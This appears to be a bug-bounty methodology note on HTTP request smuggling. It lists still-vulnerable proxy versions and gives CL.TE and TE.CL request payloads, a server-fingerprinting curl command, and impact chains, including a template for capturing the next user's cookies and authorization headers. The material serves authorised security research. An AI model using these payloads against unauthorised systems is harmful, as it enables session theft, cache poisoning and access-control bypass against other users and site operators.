# HTTP Request Smuggling

**Bounty range:** $5K-$30K | Research credit: PortSwigger / James Kettle

---

## Threat Model

Front-end proxy and back-end server disagree on where one request ends and the next begins. Content-Length vs Transfer-Encoding parsing inconsistency allows an attacker to prepend a partial request to the next victim's request queue.

---

## Still-Viable Targets (2026)

Classic CL.TE and TE.CL are largely mitigated in Nginx 1.21+, Caddy 2.x, and Envoy 1.20+ which enforce RFC 9112 strictly. Focus on:

- **HAProxy 2.4 and below** (CVE-2021-40346)
- Older F5 BIG-IP, Citrix ADC, Apache Traffic Server
- Custom Python/Go proxies lacking RFC 9112 enforcement
- CDN + origin architectures using HTTP/2 to HTTP/1.1 downgrade

---

## Attack Vectors

**Modern primary vector: H2.CL / H2.TE**

HTTP/2 to HTTP/1.1 downgrade chains in CDN+origin architectures. The CDN accepts HTTP/2 and downgrades to HTTP/1.1 when forwarding to origin. Content-Length confusion during protocol conversion creates the smuggling window.

Tools:
- Burp Suite HTTP Request Smuggler extension
- `h2csmuggler`

**Classic CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Classic TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Fingerprint front-end technology first:**
```bash
curl -sI https://target/ | grep -i "Server:"
```

**Time-delay confirmation:**
Send a smuggled GET with a 30-second timeout condition. If the front-end response delays on the next request, smuggling succeeded.

---

## Impact Chains

**Cache poisoning:**
```
# Smuggle a request whose response gets cached for all subsequent visitors
# Combines with CDN caching to deliver XSS or malicious content at scale
```

**Credential theft (next-user capture):**
```
# Smuggle a request that captures the next victim's full HTTP request
# including their session cookies and Authorization headers
POST /search HTTP/1.1
...
Transfer-Encoding: chunked

0

GET /capture HTTP/1.1
X-Ignore: X[max-length data here to capture victim's request in body]
```

**Authentication bypass:**
```
# Smuggle a request to an internal-only route filtered by front-end ACLs
# Back-end receives the internal path, front-end never saw it
```

**XSS delivery:**
```
# Inject XSS payload into next victim's response stream
# Payload appears without any URL parameters, bypassing per-parameter sanitization
```

---

## Pre-Submission Validation Gate

1. Confirmed the front-end proxy technology and version as a viable target?
2. Is the smuggling demonstrable via time-delay or next-request capture?
3. Is the impact chain complete? (cache poisoning confirmed, credential captured, bypass demonstrated)
4. Classic CL.TE/TE.CL: confirmed the target is NOT running Nginx 1.21+, Caddy 2.x, or Envoy 1.20+?
